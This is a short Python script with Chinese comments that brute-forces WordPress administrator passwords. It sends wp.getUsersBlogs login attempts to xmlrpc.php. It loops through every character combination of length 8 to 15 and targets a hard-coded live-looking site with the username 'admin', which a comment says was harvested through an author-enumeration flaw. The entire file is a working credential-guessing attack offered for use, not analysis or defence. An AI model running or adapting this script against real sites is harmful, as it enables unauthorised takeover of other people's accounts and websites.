# codding:utf-8
'''
漏洞详情请查看：http://www.freebuf.com/articles/web/38861.html
'''
import re
import requests
import itertools as its
import threadpool
import threading

import time


def ReadMe():
    print ("""说明：
    1.在本文件同目录下新建usernames.txt、passwords.txt分别存入用户名、密码字典
    2.按提示输入WordPress站点(例如:www.freebuf.com)
    """)

def gen_pwd(pwd_len):
    words = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~!@#$%^&*()_-+=/*<>:;\'"[]{}|'
    r = its.product(words, repeat=pwd_len)
    return r

def exec_req(key, requrl = "https://gzxy.me/xmlrpc.php", name = 'admin'):
    # time.sleep(2)
    key = ''.join(key)
    reqdata = '<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs\
                           </methodName><params><param><value>' + name + \
              '</value></param><param><value>' + ''.join(key) + \
              '</value></param></params></methodCall>'
    req = requests.post(url=requrl, data=reqdata)
    result = req.text
    # print(req.text)
    if "isAdmin" in result:
        print("Got it !")
        print("username :" + name + "password :" + key)
    elif "faultString" and "403" in result:
        print("{0} is not correct.".format(key))
    else:
        print("Unknown error")




def Exploit():

    if True :
    #usernames.txt 文件中其实只有一个用户名，因为我们通过author漏洞获取到了管理的用户名。
        # f_username=open("usernames.txt","r")

        for n in range(8,16):
            # for p in gen_pwd(n):
            #     exec_req(p)
            it = gen_pwd(n)

            pool = threadpool.ThreadPool(2)
            try:
                while True:
                    l_pwd = []
                    for i in range(0,2):
                        l_pwd.append(''.join(next(it)))

                    requests = threadpool.makeRequests(exec_req, l_pwd)
                    [pool.putRequest(req) for req in requests]
                    pool.wait()
            except StopIteration:
                pass


        print ("抱歉，在此字典中并未找到正确的密码")

def say(num):
    print(num)


if __name__ == '__main__' :
    ReadMe()
    Exploit()

    # pool = threadpool.ThreadPool(30)
    # requests = threadpool.makeRequests(say, range(0,1000000))
    # [pool.putRequest(req) for req in requests]
    # pool.wait()

    # words = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~!@#$%^&*()_-+=/*<>:;\'"[]{}|'
    # r = its.product(words, repeat=8)
    # print()
    # for i in r:
    #     print(''.join(i))



